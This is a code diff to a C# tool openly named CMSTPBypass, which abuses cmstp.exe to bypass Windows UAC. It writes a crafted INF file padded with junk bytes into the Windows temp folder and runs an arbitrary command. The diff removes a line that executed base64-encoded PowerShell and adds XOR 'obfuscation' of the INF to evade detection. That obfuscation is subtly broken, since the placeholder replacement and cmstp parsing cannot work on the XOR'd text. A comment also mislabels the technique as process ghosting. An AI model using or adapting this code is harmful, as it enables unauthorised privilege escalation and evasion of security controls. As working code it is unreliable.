@@ -4,11 +4,11 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
 
 public class CMSTPBypass
 {
+    // Original INF data
     public const string InfData = @"
 [version]
 Signature=$chicago$
@@ -21,7 +21,6 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 [RunPreSetupCommandsSection]
 REPLACE_COMMAND_LINE
 taskkill /F /IM cmstp.exe
-powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('B64ENCODEDPS1')))""
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
@@ -34,6 +33,22 @@ ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
 ";
 
+    // XOR encryption key
+    private const byte XorKey = 0x55; // Change this key as needed
+
+    // Function to obfuscate INF data using XOR
+    public static string ObfuscateInfData(string originalInfData)
+    {
+        byte[] infBytes = Encoding.UTF8.GetBytes(originalInfData);
+
+        for (int i = 0; i < infBytes.Length; i++)
+        {
+            infBytes[i] = (byte)(infBytes[i] ^ XorKey);
+        }
+
+        return Encoding.UTF8.GetString(infBytes);
+    }
+
     [DllImport("user32.dll")]
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     [DllImport("user32.dll", SetLastError = true)]
@@ -43,11 +58,16 @@ ShortSvcName=""CorpVPN""
 
     public static void Main(string[] args)
     {
-        string commandToExecute = "your_command_here"; // Replace with your actual command
-        Execute(commandToExecute);
+        // Replace with the actual command you want to execute for process ghosting
+        string commandToExecute = "runlegacyexplorer.exe"; // Execute the alternative Explorer.exe
+
+        // Obfuscate the .INF data
+        string obfuscatedInfData = ObfuscateInfData(InfData);
+
+        Execute(commandToExecute, obfuscatedInfData);
     }
 
-    public static void Execute(string commandToExecute)
+    public static void Execute(string commandToExecute, string obfuscatedInfData)
     {
         if (!File.Exists(BinaryPath))
         {
@@ -67,7 +87,7 @@ ShortSvcName=""CorpVPN""
         };
         Process.Start(killStartInfo);
 
-        string infFilePath = SetInfFile(commandToExecute);
+        string infFilePath = SetInfFile(commandToExecute, obfuscatedInfData);
 
         Console.WriteLine("Payload file written to " + infFilePath);
 
@@ -101,7 +121,7 @@ ShortSvcName=""CorpVPN""
         return windowHandle;
     }
 
-    public static string SetInfFile(string commandToExecute)
+    public static string SetInfFile(string commandToExecute, string obfuscatedInfData)
     {
         string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
         string temporaryDir = "C:\\windows\\temp";
@@ -116,7 +136,8 @@ ShortSvcName=""CorpVPN""
         new Random().NextBytes(junkData);
         File.WriteAllBytes(outputFile.ToString(), junkData);
 
-        File.AppendAllText(outputFile.ToString(), InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
+        // Append the obfuscated INF content
+        File.AppendAllText(outputFile.ToString(), obfuscatedInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
 
         return outputFile.ToString();
     }
